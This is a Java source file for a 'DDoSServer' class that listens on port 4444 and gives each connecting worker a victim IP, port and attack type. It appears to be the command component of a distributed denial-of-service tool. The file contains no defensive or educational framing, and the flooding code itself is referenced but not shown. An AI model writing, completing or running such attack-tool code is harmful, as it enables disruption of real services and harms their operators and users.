package dos;

import java.io.IOException;
import java.net.ServerSocket;

public class DDoSServer implements Runnable {

    public static boolean listening = true;
    private ServerSocket socket;
    private String victim_ip;
    private String victim_port;
    private String type;

    public DDoSServer(String ip,String port,String type) {
        try {
            socket = new ServerSocket(4444);
            this.victim_ip=ip;
            this.victim_port=port;
            this.type=type;
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        // TODO Auto-generated method stub

        while (listening) {

            try {
                new WorkerThread(socket.accept(),this.victim_ip,this.victim_port,this.type).start();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

    }
}
